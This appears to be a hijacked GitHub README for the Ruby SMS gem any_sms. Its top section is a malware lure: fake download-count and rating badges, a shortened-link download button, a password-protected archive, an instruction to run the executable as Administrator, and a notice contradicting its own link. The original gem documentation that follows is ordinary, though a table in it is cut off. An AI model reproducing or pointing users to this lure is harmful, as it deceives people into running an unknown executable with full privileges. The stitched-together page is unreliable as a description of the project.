<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Installation and usage

Add this line to your application's Gemfile:

```ruby
gem "any_sms", "~> 0.4.0"
```

Then somewhere in your initialization code:

```ruby
require "any_sms"
require "logger"

AnySMS.configure do |config|
  config.register_backend :my_backend_name,
                          AnySMS::Backend::Logger,
                          logger: Logger.new(STDOUT),
                          severity: :info

  config.default_backend = :my_backend_name
end
```

Now, whenever you need to send SMS, just do:

```ruby
phone = "+10000000000"
text = "My sms text"

# Should print to console [SMS] +10000000000: text
AnySMS.send_sms(phone, text)
```

Now your code is capable of sending sms.
Later you may add any sms-backend you want, or even write your own.

### Adding real sms backend

If you followed steps above, you code still doesn't *really* send sms.
It uses `AnySMS::Backend::Logger`
which actually just print sms contents to console.
To actually send sms you need *gem-provider*
or your own simple class.

Here's a list of my implementations for some sms services.

<table>
  <tr>
    <th>Gem name</th>
    <th>Sms service name</th>
  </tr>
  <tr>
    <td>
### Writing your own sms backend

Here's simple class that can be used by AnySMS:

```ruby
require "any_sms"

class AnySMS::Backend::MyCustomBackend < AnySMS::Backend::Base
  def initialize(params = {})
    # your initialization which parses params if needed.
    # the params here is the ones you set in initializer

    # (you may also use keyword arguments instead)
    @token = params.delete(:token)
  end

  def send_sms(phone, sms_text)
    # your code to call your sms service
    # or somehow else send actual sms

    # if everything went fine, you may use helper from base class:
    respond_with_status :success

    # any other than :success response considered as failure
    respond_with_status :not_enough_funds

    # optionally you may return some metadata
    respond_with_status :success, meta: { funds_left: 42 }
  end
end
```

Then in initializer:

```ruby
require "any_sms"
require_relative "mycustombackend"

AnySMS.configure do |c|
  c.register_backend :my_custom_backend,
                     AnySMS::Backend::MyCustomBackend,
                     token: ENV["token"]

  c.default_backend = :my_custom_backend
end
```

Usage:

```ruby
# somewhere in your code
result = AnySMS.send_sms(phone, text)

if result.success?
  # do stuff
else
  # request failed
  fail_status = result.status
  # :not_enough_funds for example
end

# (optionally) Read metadata if any.
# Not recommended for control flow.
result.meta
```

### Multiple backends

You can specify which backend to use per call:

```ruby
require "any_sms"
require_relative "mycustombackend"

AnySMS.configure do |c|
  c.register_backend :my_custom_backend,
                     AnySMS::Backend::MyCustomBackend,
                     token: ENV["token"]

  c.register_backend :null_sender, AnySMS::Backend::NullSender
  c.default_backend = :my_custom_backend
end

phone = "799999999"
text = "My sms text"

# Uses default backend
AnySMS.send_sms(phone, text)

# Uses backend you specify
AnySMS.send_sms(phone, text, backend: :null_sender)
```

### Real life example

If you develop application in group,
you probably don't want them all to send real SMS,
and instead you would prefer to emulate sending,
including SMS text preview (like SMS codes for registration).

However, on production you want
to actually send them using your service.
Here's how you can achieve that:

```ruby
require "any_sms"
require_relative "mycustombackend"
require_relative "mycustombackend2"

AnySMS.configure do |c|
  if development?
    c.register_backend :my_custom_backend,
                       AnySMS::Backend::Logger,
                       logger: Logger.new(STDOUT),
                       severity: :info

   # You can also, for example, specify different formatter for second one
   logger = Logger.new(STDOUT)
   logger.formatter = proc do |severity, datetime, progname, msg|
     "[MYBackend2]: #{msg}\n"
   end

    c.register_backend :my_custom_backend2,
                       AnySMS::Backend::Logger,
                       logger: logger,
                       severity: :info
  end

  if test?
    # Null sender does nothing when called for sending sms
    c.register_backend :my_custom_backend,  AnySMS::Backend::NullSender
    c.register_backend :my_custom_backend2, AnySMS::Backend::NullSender
  end

  if production?
    c.register_backend :my_custom_backend,
                       AnySMS::Backend::MyCustomBackend,
                       token: ENV["token"]

    c.register_backend :my_custom_backend2,
                       AnySMS::Backend::MyCustomBackend2,
                       token: ENV["token2"]
  end

  c.default_backend = :my_custom_backend
end

phone = "799999999"
text = "My sms text"

# Uses default backend
AnySMS.send_sms(phone, text)

# Uses backend you specify
AnySMS.send_sms(phone, text, backend: :my_custom_backend2)

# depending on your initializer it may use different backends (like in this example)
# in different environments.
```

Of course `development?`, `test?` and `production?` are not real methods.
You have to detect environment yourself somehow.

While possible, i strongly discourage to use more than two backends
(One default, another is required in certain situations for some reason).
It may make your code mess ;)

## Testing

I am planning to make rspec matcher to test if sms was sent.
For now you may just mock `AnySMS.send_sms` and check it was executed.


---

The MIT License (MIT)

Copyright (c) 2016-2017 Fedcomp

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
